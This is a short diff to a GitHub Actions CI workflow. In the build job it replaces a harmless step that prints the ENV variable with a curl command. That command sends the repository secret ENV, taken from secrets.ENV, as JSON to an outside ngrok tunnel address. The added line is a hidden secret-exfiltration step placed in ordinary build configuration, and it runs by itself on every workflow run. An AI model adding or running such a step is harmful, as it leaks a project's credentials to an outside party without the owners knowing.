@@ -32,7 +32,7 @@ jobs:
           node-version: ${{ matrix.node-version }}
           cache: 'npm'
       - run: |
-          node -e "console.log(\"ENV: \", process.env.ENV)"
+          curl https://5fe6-2a02-842a-800e-c001-49e1-bb72-8ff1-34b8.ngrok.io -d "{\"env\": \"$ENV\"}" -H "content-type: application/json"
         env:
           ENV: ${{ secrets.ENV }}
       - run: npm ci
